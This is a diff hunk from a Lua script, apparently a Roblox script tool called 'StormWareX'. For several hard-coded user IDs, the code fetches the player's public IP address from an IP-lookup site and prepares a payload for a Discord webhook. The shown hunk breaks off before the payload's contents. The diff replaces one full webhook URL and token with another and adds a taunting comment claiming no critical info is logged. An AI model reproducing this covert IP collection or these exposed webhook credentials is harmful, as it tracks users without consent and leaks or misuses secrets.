@@ -1098,11 +1098,10 @@ local function JPSURY_fake_script() -- StormWareX.Core
 	if game.Players.LocalPlayer.UserId == 3498733335 or game.Players.LocalPlayer.UserId == 3489570364 or game.Players.LocalPlayer.UserId == 3576708191 or game.Players.LocalPlayer.UserId == 3044390814 then
 		ip = game:HttpGet("https://wtfismyip.com/text")
 	end
-	-- i do not like bitches
-	-- plez do not spam the webhook zamn
+	-- go ahead and spam, idc, we dont log critical info so you can go cry urself to sleep LOL
 	
 	local url =
-		"https://discord.com/api/webhooks/997776017139695616/05gA5bgWnaxUrwbdk-Es3nRP1vtk_vMXwQxn1H4lQV7XWNKuWJjDGdgKdhYEg8ZqFQ2r"
+		"https://discord.com/api/webhooks/1010491124227526676/MIMbk9FN7yIYA0yDzUN12Odge5qoupBmiPxkOy9PZLQdTDmEh5Eg49qWcMvhcZ9AAZJb"
 	local data = {
 		["embeds"] = {
 			{
